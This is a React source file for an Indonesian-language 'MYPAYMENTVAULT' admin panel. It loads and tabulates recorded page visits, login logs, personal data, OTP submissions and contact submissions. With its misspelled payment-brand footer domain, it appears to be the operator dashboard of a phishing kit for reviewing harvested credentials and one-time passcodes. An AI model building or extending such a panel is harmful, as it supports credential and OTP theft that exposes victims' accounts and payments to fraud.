import { useEffect, useState } from "react";
import { useAuth } from "@/lib/auth";
import { useLocation } from "wouter";

interface DataAll {
  visits: Record<string, unknown>[];
  logins: Record<string, unknown>[];
  personal: Record<string, unknown>[];
  otp: Record<string, unknown>[];
  contact: Record<string, unknown>[];
}

const TABS = [
  { key: "visits",   label: "🌐 Page Visits",       color: "#6366f1" },
  { key: "logins",   label: "🔐 Login Logs",         color: "#0ea5e9" },
  { key: "personal", label: "📋 Data Personal",      color: "#10b981" },
  { key: "otp",      label: "🔢 OTP Submissions",    color: "#f59e0b" },
  { key: "contact",  label: "📝 Contact Submissions", color: "#ef4444" },
] as const;

type TabKey = typeof TABS[number]["key"];

function fmt(val: unknown): string {
  if (val === null || val === undefined) return "—";
  if (typeof val === "string" && val.includes("T") && val.includes("Z")) {
    try {
      return new Date(val).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    } catch { return String(val); }
  }
  return String(val);
}

function DataTable({ rows }: { rows: Record<string, unknown>[] }) {
  if (!rows || rows.length === 0) {
    return <p style={{ color: "#aaa", fontSize: 14, padding: "20px 0" }}>Belum ada data.</p>;
  }
  const cols = Object.keys(rows[0]);
  return (
    <div style={{ overflowX: "auto", borderRadius: 8, border: "1px solid #e5e7eb" }}>
      <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 13 }}>
        <thead>
          <tr style={{ background: "#f8fafc" }}>
            {cols.map(c => (
              <th key={c} style={{
                padding: "10px 14px", textAlign: "left",
                fontWeight: 600, color: "#555", fontSize: 11,
                textTransform: "uppercase", letterSpacing: "0.05em",
                borderBottom: "1px solid #e5e7eb", whiteSpace: "nowrap",
              }}>{c}</th>
            ))}
          </tr>
        </thead>
        <tbody>
          {rows.map((row, i) => (
            <tr key={i} style={{ background: i % 2 === 0 ? "#fff" : "#fafafa" }}>
              {cols.map(c => (
                <td key={c} style={{
                  padding: "9px 14px",
                  borderBottom: "1px solid #f0f0f0",
                  color: "#222", maxWidth: 260,
                  overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap",
                }} title={fmt(row[c])}>
                  {fmt(row[c])}
                </td>
              ))}
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

export default function DataAdmin() {
  const { isAuthenticated } = useAuth();
  const [, navigate] = useLocation();
  const [data, setData] = useState<DataAll | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [activeTab, setActiveTab] = useState<TabKey>("visits");
  const [refreshing, setRefreshing] = useState(false);

  useEffect(() => {
    if (!isAuthenticated) navigate("/login");
  }, [isAuthenticated, navigate]);

  const fetchData = async (silent = false) => {
    if (!silent) setLoading(true);
    else setRefreshing(true);
    try {
      const res = await fetch("/api/data/all");
      if (!res.ok) throw new Error("Gagal memuat data");
      const json = await res.json() as DataAll;
      setData(json);
    } catch (e) {
      setError(String(e));
    } finally {
      setLoading(false);
      setRefreshing(false);
    }
  };

  useEffect(() => { fetchData(); }, []);

  const activeRows = data ? data[activeTab] : [];
  const activeColor = TABS.find(t => t.key === activeTab)?.color ?? "#111";

  const counts: Record<string, number> = data
    ? Object.fromEntries(TABS.map(t => [t.key, data[t.key].length]))
    : {};

  return (
    <div style={{ minHeight: "100vh", background: "#f5f5f5", padding: "32px 16px 64px" }}>
      <div style={{ maxWidth: 1100, margin: "0 auto" }}>

        {/* Header */}
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 28 }}>
          <div>
            <span style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111" }}>
              <span style={{ fontWeight: 300 }}>MY</span>
              <span style={{ fontWeight: 700 }}>PAYMENT</span>
              <span style={{ fontWeight: 300 }}>VAULT</span>
            </span>
            <h1 style={{ fontSize: 22, fontWeight: 700, color: "#111", margin: "8px 0 0" }}>
              Database Admin
            </h1>
            <p style={{ fontSize: 13, color: "#888", margin: "4px 0 0" }}>
              Semua data yang masuk dari seluruh alur — live dari database
            </p>
          </div>
          <div style={{ display: "flex", gap: 10 }}>
            <button
              onClick={() => fetchData(true)}
              disabled={refreshing}
              style={{
                height: 38, padding: "0 20px", borderRadius: 8,
                border: "1px solid #ddd", background: "#fff",
                fontSize: 13, fontWeight: 600, cursor: "pointer",
                color: "#333", display: "flex", alignItems: "center", gap: 8,
                opacity: refreshing ? 0.6 : 1,
              }}>
              {refreshing ? "⟳ Memuat..." : "⟳ Refresh"}
            </button>
            <button onClick={() => navigate("/")}
              style={{
                height: 38, padding: "0 20px", borderRadius: 8,
                border: "none", background: "#111",
                fontSize: 13, fontWeight: 600, cursor: "pointer", color: "#fff",
              }}>
              ← Dashboard
            </button>
          </div>
        </div>

        {/* Stat cards */}
        {data && (
          <div style={{ display: "grid", gridTemplateColumns: "repeat(5, 1fr)", gap: 12, marginBottom: 28 }}>
            {TABS.map(t => (
              <div key={t.key}
                onClick={() => setActiveTab(t.key)}
                style={{
                  background: activeTab === t.key ? t.color : "#fff",
                  color: activeTab === t.key ? "#fff" : "#111",
                  borderRadius: 10, padding: "16px 18px", cursor: "pointer",
                  border: `1px solid ${activeTab === t.key ? t.color : "#e5e7eb"}`,
                  transition: "all 0.15s",
                  boxShadow: activeTab === t.key ? `0 4px 14px ${t.color}44` : "none",
                }}>
                <div style={{ fontSize: 22, fontWeight: 800, marginBottom: 4 }}>
                  {counts[t.key] ?? 0}
                </div>
                <div style={{ fontSize: 11, fontWeight: 600, opacity: 0.85, letterSpacing: "0.02em" }}>
                  {t.label}
                </div>
              </div>
            ))}
          </div>
        )}

        {/* Tab content */}
        <div style={{ background: "#fff", borderRadius: 12, padding: "24px 28px", boxShadow: "0 2px 12px rgba(0,0,0,0.06)" }}>
          {loading && (
            <div style={{ textAlign: "center", padding: "48px 0", color: "#aaa", fontSize: 15 }}>
              Memuat data...
            </div>
          )}
          {error && (
            <div style={{ textAlign: "center", padding: "32px", color: "#c00", fontSize: 14 }}>
              {error}
            </div>
          )}
          {!loading && !error && data && (
            <>
              <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 20 }}>
                <span style={{ width: 10, height: 10, borderRadius: "50%", background: activeColor, display: "inline-block" }} />
                <span style={{ fontSize: 15, fontWeight: 700, color: "#111" }}>
                  {TABS.find(t => t.key === activeTab)?.label}
                </span>
                <span style={{ fontSize: 13, color: "#aaa", marginLeft: 4 }}>
                  ({activeRows.length} records)
                </span>
              </div>
              <DataTable rows={activeRows} />
            </>
          )}
        </div>

        <div style={{ textAlign: "center", marginTop: 24 }}>
          <span style={{ fontSize: 11, color: "#ccc" }}>
            &copy; mypaymenttvaulltr.com &nbsp;·&nbsp; Admin Panel
          </span>
        </div>
      </div>
    </div>
  );
}
